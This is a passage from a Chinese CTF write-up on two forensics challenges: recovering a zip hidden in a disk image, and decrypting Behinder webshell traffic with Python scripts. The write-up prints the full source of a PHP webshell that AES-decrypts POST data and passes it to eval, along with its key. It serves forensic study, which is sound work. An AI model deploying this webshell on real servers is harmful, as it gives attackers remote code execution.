<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%8f%aa%e7%95%99%e6%b8%85%e7%99%bd%e5%9c%a8%e4%ba%ba%e9%97%b4 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>解压附件压缩包，得到一个位置后缀的文件，因此尝试file识别一下</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417193834317.png alt=/posts/f002407/imgs/image-20250417193834317.png height=191 width=1744></p><p>发现是磁盘文件，因此我们尝试直接用r-stdio打开</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417193952651.png alt=/posts/f002407/imgs/image-20250417193952651.png height=1272 width=2568></p><p>发现有一个<code>The flag is here.zip</code>，尝试恢复，发现可以正常恢复出来</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417194045254.png alt=/posts/f002407/imgs/image-20250417194045254.png height=852 width=1482></p><p>打开发现里面有很多的目录，当我们按照时间早晚进行排序的时候，发现了明显的zip压缩包的PK头(504B0304)</p><p>因此尝试写一个Python脚本进行提取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pyzipper</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>file_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>pyzipper</span><span class=o>.</span><span class=n>AESZipFile</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span> <span class=k>as</span> <span class=n>zip_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>file_info</span> <span class=ow>in</span> <span class=n>zip_file</span><span class=o>.</span><span class=n>infolist</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=n>filename</span> <span class=o>=</span> <span class=n>file_info</span><span class=o>.</span><span class=n>filename</span>
</span></span><span class=line><span class=cl>            <span class=c1># 跳过目录项</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>filename</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=c1># 将修改时间转换为 datetime 对象</span>
</span></span><span class=line><span class=cl>            <span class=n>mod_time</span> <span class=o>=</span> <span class=n>datetime</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>file_info</span><span class=o>.</span><span class=n>date_time</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span>  <span class=c1># 年</span>
</span></span><span class=line><span class=cl>                <span class=n>file_info</span><span class=o>.</span><span class=n>date_time</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span>  <span class=c1># 月</span>
</span></span><span class=line><span class=cl>                <span class=n>file_info</span><span class=o>.</span><span class=n>date_time</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span>  <span class=c1># 日</span>
</span></span><span class=line><span class=cl>                <span class=n>file_info</span><span class=o>.</span><span class=n>date_time</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span>  <span class=c1># 时</span>
</span></span><span class=line><span class=cl>                <span class=n>file_info</span><span class=o>.</span><span class=n>date_time</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span>  <span class=c1># 分</span>
</span></span><span class=line><span class=cl>                <span class=n>file_info</span><span class=o>.</span><span class=n>date_time</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span>   <span class=c1># 秒</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>file_list</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>filename</span><span class=p>,</span> <span class=n>mod_time</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>file_list</span><span class=o>.</span><span class=n>sort</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=c1># 按照修改时间排序</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>file_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>+=</span> <span class=n>item</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.zip&#34;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>zip_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_path</span> <span class=o>=</span> <span class=s2>&#34;The flag is here.zip&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>func1</span><span class=p>(</span><span class=n>zip_path</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>运行以上脚本提取出压缩包后，解压即可得到flag：<code>DASCTF{Q29uZ3JhdHVsYXRpb25z}</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417194244861.png alt=/posts/f002407/imgs/image-20250417194244861.png height=1461 width=2527></p><p>当然，如果这里不会写脚本提取，我们也可以尝试用winrar的报告功能生成报告</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417194400019.png alt=/posts/f002407/imgs/image-20250417194400019.png height=927 width=1656></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417194456142.png alt=/posts/f002407/imgs/image-20250417194456142.png height=1461 width=2527></p><p>然后我们再写一个脚本对报告中的数据进行处理即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;The flag is here.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;flag.txt&#39;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(line)</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>+=</span> <span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=题目名称-icewater><span>题目名称 IceWater</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-icewater class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>打开流量包，发现是webshell流量，直接拿CTF-NetA梭一下</p><p>根据默认密钥 <code>e45e329feb5d925b</code>，我们可以知道是冰蝎流量分析</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250417210225286.png alt=/posts/f002407/imgs/image-20250417210225286.png height=1778 width=2740></p><p>流量包不多，我们手动解密分析了前面几个流量包后发现，一共有两个马，分别是<code>shell.php</code>和<code>she1l.php</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419154429421.png alt=/posts/f002407/imgs/image-20250419154429421.png height=376 width=1369></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419154438433.png alt=/posts/f002407/imgs/image-20250419154438433.png height=396 width=1369></p><p>然后解密HTTP流4的数据，可以得到第二个马的源码</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419154513307.png alt=/posts/f002407/imgs/image-20250419154513307.png height=1399 width=1369></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419154537135.png alt=/posts/f002407/imgs/image-20250419154537135.png height=1528 width=2560></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419154550735.png alt=/posts/f002407/imgs/image-20250419154550735.png height=807 width=2178></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419154618668.png alt=/posts/f002407/imgs/image-20250419154618668.png height=1528 width=2560></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=nd>@error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=err>$</span><span class=n>key</span><span class=o>=</span><span class=s2>&#34;5b4582c9d56b5b33&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=err>$</span><span class=n>_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>]</span><span class=o>=</span><span class=err>$</span><span class=n>key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=err>$</span><span class=n>post</span><span class=o>=</span><span class=n>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=err>!</span><span class=n>extension_loaded</span><span class=p>(</span><span class=s1>&#39;openssl&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=err>$</span><span class=n>t</span><span class=o>=</span><span class=s2>&#34;base64_&#34;</span><span class=o>.</span><span class=s2>&#34;decode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=err>$</span><span class=n>post</span><span class=o>=</span><span class=err>$</span><span class=n>t</span><span class=p>(</span><span class=err>$</span><span class=n>post</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=k>for</span><span class=p>(</span><span class=err>$</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=err>$</span><span class=n>i</span><span class=o>&lt;</span><span class=n>strlen</span><span class=p>(</span><span class=err>$</span><span class=n>post</span><span class=p>);</span><span class=err>$</span><span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    			 <span class=err>$</span><span class=n>post</span><span class=p>[</span><span class=err>$</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=err>$</span><span class=n>post</span><span class=p>[</span><span class=err>$</span><span class=n>i</span><span class=p>]</span><span class=o>^</span><span class=err>$</span><span class=n>key</span><span class=p>[</span><span class=err>$</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>    			<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=err>$</span><span class=n>post</span><span class=o>=</span><span class=n>openssl_decrypt</span><span class=p>(</span><span class=err>$</span><span class=n>post</span><span class=p>,</span> <span class=s2>&#34;AES128&#34;</span><span class=p>,</span> <span class=err>$</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=err>$</span><span class=n>arr</span><span class=o>=</span><span class=n>explode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=err>$</span><span class=n>post</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=err>$</span><span class=n>func</span><span class=o>=</span><span class=err>$</span><span class=n>arr</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=err>$</span><span class=n>params</span><span class=o>=</span><span class=err>$</span><span class=n>arr</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>C</span><span class=p>{</span><span class=n>public</span> <span class=n>function</span> <span class=n>__invoke</span><span class=p>(</span><span class=err>$</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span><span class=nb>eval</span><span class=p>(</span><span class=err>$</span><span class=n>p</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);}}</span>
</span></span><span class=line><span class=cl>    <span class=nd>@call_user_func</span><span class=p>(</span><span class=n>new</span> <span class=n>C</span><span class=p>(),</span><span class=err>$</span><span class=n>params</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=o>&gt;</span></span></span></code></pre></td></tr></table></div></div><p>然后发现第二个马的密钥不是默认密钥了，是 <code>5b4582c9d56b5b33</code></p><p>并且加密方式也换成了AES-CBC，IV为<code>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419154902953.png alt=/posts/f002407/imgs/image-20250419154902953.png height=1528 width=2560></p><p>然后当我们分析到HTTP流7和流8的时候，发现攻击者创建了一张PNG图片</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419155450612.png alt=/posts/f002407/imgs/image-20250419155450612.png height=1399 width=1369></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419155506249.png alt=/posts/f002407/imgs/image-20250419155506249.png height=1464 width=2556></p><p>这个流里有好多个请求和响应，我们继续分析后面的请求，发现攻击者一直在往这个PNG里加东西</p><p>猜测是这个图片比较大，攻击者分了好几次写入</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250419155644798.png alt=/posts/f002407/imgs/image-20250419155644798.png height=1461 width=2556></p><p>鉴于流量包中的请求比较多，因此我们把流7和流8的数据以文本的形式保存到本地，然后写个脚本匹配提取即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;5b4582c9d56b5b33&#34;</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># 默认填充到16字节(AES-128)</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_aes_cbc</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>ciphertext_base64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>decrypted</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>dec_data</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;1.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>req_data</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;Cookie: PHPSESSID=m76qslkgb4tuu1ocg07i1rr1f0\n\n(.*?)\nHTTP/1&#34;</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(req_data))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>enc_data</span> <span class=ow>in</span> <span class=n>req_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(enc_data)</span>
</span></span><span class=line><span class=cl>        <span class=n>dec_data</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>decrypt_aes_cbc</span><span class=p>(</span><span class=n>enc_data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(dec_data))</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;2.txt&#34;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>dec_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>dec_data</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;2.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>base64_data</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;base64_decode\(&#39;(.*?)&#39;\)\);&#34;</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>base64_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(item[-100:])</span>
</span></span><span class=line><span class=cl>        <span class=n>dec_data</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>item</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(dec_data))</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;3.txt&#34;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>dec_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func3</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;3.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>base64_data</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\$content=</span><span class=se>\&#34;</span><span class=s2>(.*?)</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(base64_data))</span>
</span></span><span class=line><span class=cl>    <span class=n>base64_png</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>base64_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>png_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>base64_png</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.png&#34;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>png_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># func1()</span>
</span></span><span class=line><span class=cl>    <span class=c1># func2()</span>
